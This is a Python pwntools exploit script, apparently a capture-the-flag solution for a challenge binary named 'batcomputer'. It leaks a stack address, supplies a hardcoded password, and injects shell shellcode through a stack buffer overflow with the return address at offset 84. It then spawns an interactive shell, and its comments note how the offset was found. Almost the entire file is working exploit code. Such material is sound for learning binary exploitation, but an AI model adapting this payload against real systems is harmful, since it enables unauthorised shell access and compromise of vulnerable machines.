#!/usr/bin/env python3

from pwn import *


def main():
    context.log_level = 'DEBUG'
    context(os='linux', arch='amd64')
    io = process(b'./batcomputer')

    # STEP 0: Enumerate the binary (get to vuln code)
    password = b'b4tp@$$w0rd!'
    max_payload_len = 137

    # STEP 1: Leak Stack Address by choosing option 1
    io.sendlineafter(b'> ', b'1')                             #send str of size '1 line' after prompt of char '> ' appears
    stack_address = io.recvline().strip().split()[-1]       #store response of size '1 line' into var; py eq to cut -d ' ' -f <last element>
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])    #py voodoo incantation
    stack_address = stack_address.rjust(8, '\x00')           #Add null bytes to the 'right' of var if len(var) != 8 bytes
    stack_address = u64(stack_address, endian='big')
    log.success(f'Leaked stack address: {p64(stack_address)}')

    print(stack_address)

    # STEP 2: Buffer Overflow
    io.sendlineafter(b'> ', b'2')   
    io.sendlineafter(b'password: ', password)   

    return_address_offset = 84
    shellcode = asm(
        shellcraft.popad() + 
        shellcraft.sh()
    )
    padding = b'A' * (return_address_offset - len(shellcode))
    payload = shellcode + padding + p64(stack_address)

    assert len(payload) <= max_payload_len, f'Payload "{len(payload)}" IS Overwhelming. Allowed: {max_payload_len}. len(shellcode): {len(shellcode)}'
    io.sendlineafter(b'commands: ', payload)

    # POST STEP 6: Further debug with ida
#    input('IDA')

    # STEP 3: Trigger bof
    io.sendlineafter(b'> ', b'3')   
    io.interactive()

    # STEP 4: Pattern create 
    # >>> cyclic(137)
    # aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj

    # STEP 5: Find offset; create vars[return_address_offset, padding, shellcode]
    # >>> cyclic_find('vaaa') 
    # 84

    # STEP 6: Moved shellcode
    # Before: 
    #       payload = padding + p64(stack_address + 8) + shellcode
    #       payload = | AAAAAAAAAAAAAAA | RETN | + 8 (//deadcode?) | SHELL |    
    # After: 
    #       payload = shellcode + padding + p64(stack_address)
    #       payload = | SHELL | AAAAAAAAAAAAAAA | RETN |  



if __name__ == '__main__':
    main()